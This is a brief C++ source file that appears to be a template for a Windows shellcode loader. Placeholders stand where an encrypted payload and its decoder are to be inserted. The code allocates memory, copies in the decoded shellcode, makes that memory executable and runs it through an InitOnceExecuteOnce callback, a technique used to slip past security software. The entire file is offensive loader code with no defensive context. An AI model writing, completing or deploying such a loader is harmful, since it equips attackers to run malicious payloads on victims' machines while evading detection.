#include <windows.h>
#include "base64.h"
#include "syscall.h"


char Ciphertext[] = "<Ciphertext>";

int main() {

	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	PVOID lpContext;
	BOOL  bStatus;

	INIT_ONCE g_InitOnce = INIT_ONCE_STATIC_INIT;

	::InitOnceExecuteOnce(&g_InitOnce, (PINIT_ONCE_FN)addr, NULL, &lpContext);

}